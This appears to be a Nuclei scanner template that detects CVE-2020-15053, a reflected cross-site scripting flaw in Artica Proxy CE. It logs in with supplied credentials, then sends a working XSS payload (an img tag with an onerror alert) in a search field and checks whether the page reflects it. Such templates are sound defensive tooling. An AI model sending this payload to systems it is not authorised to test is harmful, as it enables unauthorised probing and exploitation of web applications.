id: CVE-2020-15053
info:
  author: TenBird
  classification:
    cve-id: CVE-2020-15053
  description: 'An issue was discovered in Artica Proxy CE before 4.28.030.418. Reflected
    XSS exists via these search fields real time request, System Events, Proxy Events,
    Proxy Objects, and Firewall objects.

    '
  name: Artica Proxy CE before 4.28.030.418 - Cross Site Scripting
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2020-15053
  severity: medium
  tags: cve,cve2020,artica,xss,authenticated
requests:
- cookie-reuse: true
  matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - '"><img src=x onerror=alert(`nuclei`)>'
  matchers-condition: and
  raw:
  - 'POST /logon.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    artica_username={{username}}&artica_password={{password}}

    '
  - 'POST /squid.influx.log.php?events-list=yes HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    page=1&rp=50&sortname=zdate&sortorder=DESC&query=%22%3E%3Cimg+src%3Dx+onerror%3Dalert(''nuclei'')%3E&qtype=FAMILYSITE

    '
